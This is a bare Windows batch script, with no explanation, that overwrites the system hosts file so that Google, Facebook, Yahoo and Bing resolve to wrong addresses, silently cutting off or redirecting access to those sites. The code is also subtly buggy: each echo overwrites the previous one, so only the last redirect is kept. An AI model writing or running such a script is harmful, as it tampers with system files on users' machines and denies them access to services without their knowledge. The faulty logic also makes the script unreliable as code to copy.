@echo off
echo 8.8.8.8  www.google.com > %temp%\temphosts.txt
echo 0.0.0.0  www.facebook.com > %temp%\temphosts.txt
echo 1.1.1.1  www.yahoo.com www.bing.com > %temp%\temphosts.txt
type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\temphosts.txt
copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts
